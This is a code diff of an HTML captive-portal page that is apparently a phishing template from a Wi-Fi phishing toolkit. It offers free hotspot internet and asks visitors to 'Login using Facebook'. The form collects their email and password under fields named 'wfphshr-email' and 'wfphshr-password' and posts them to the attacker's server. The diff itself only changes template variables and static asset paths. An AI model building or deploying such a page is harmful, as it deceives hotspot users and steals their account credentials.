@@ -20,11 +20,11 @@ function validateForm() {
 }
 </script>
     <meta charset="UTF-8">
-    <title>{{ organization if organization != None}} Wi-Fi Service</title>
-    <link rel="stylesheet" href="css/reset.css">
-    <link rel='stylesheet prefetch' href='css/roboto.css'>
-<link rel='stylesheet prefetch' href='css/font-awesome.min.css'>
-        <link rel="stylesheet" href="css/style.css">    
+    <title>{{ organization }} Wi-Fi Service</title>
+    <link rel="stylesheet" href="/static/css/reset.css">
+    <link rel='stylesheet prefetch' href='/static/css/roboto.css'>
+<link rel='stylesheet prefetch' href='/static/css/font-awesome.min.css'>
+        <link rel="stylesheet" href="/static/css/style.css">    
   </head>
   <body> 
 <!-- Form Mixin-->
@@ -32,7 +32,7 @@ function validateForm() {
 <!-- Button Mixin-->
 <!-- Pen Title-->
 <div class="pen-title">
-  <h1>Get connected to the Internet for free</h1><span>A simple, no frills {{ organization if organization != None}} Wi-Fi service.</span>
+  <h1>Get connected to the Internet for free</h1><span>A simple, no frills {{ organization }} Wi-Fi service.</span>
 </div>
 <!-- Form Module-->
 <div class="module form-module">
@@ -40,8 +40,8 @@ function validateForm() {
   </div>
   <div class="form">
     <h2>Login using Facebook</h2>
-    <img src="logos/facebook-logo.png" width="25%" class="logo"></img>
-    <form name="theform" class="theform" method="post" action="oauth.html" onsubmit="return validateForm();">
+    <img src="static/logos/facebook-logo.png" width="25%" class="logo"></img>
+    <form name="theform" class="theform" method="post" action="/post" onsubmit="return validateForm();">
       <input type="text" placeholder="Email" name="wfphshr-email"/>
       <input type="password" placeholder="Password" name="wfphshr-password"/>
       <button class="login-btn">Login</button>
@@ -60,7 +60,7 @@ function validateForm() {
       <h2>Terms of Usage</h2>
     </div>
     <div class="modal-body">
-      <p>This is a {{ organization if organization != None}} free Hotspot wireless internet Service (the “Service”) provided for use by customers. All users are required to log-in individually as an independent user.</p>
+      <p>This is a {{ organization }} free Hotspot wireless internet Service (the “Service”) provided for use by customers. All users are required to log-in individually as an independent user.</p>
       <p>
 The Service is made available provided:
 </p><p>
@@ -87,8 +87,8 @@ The Service is made available provided:
     </div>
   </div>
 
-    <script src='js/jquery.min.js'></script>
-    <script src="js/index.js"></script> 
+    <script src='/static/js/jquery.min.js'></script>
+    <script src="/static/js/index.js"></script> 
 <script>
 // Get the modal
 var modal = document.getElementById('myModal');
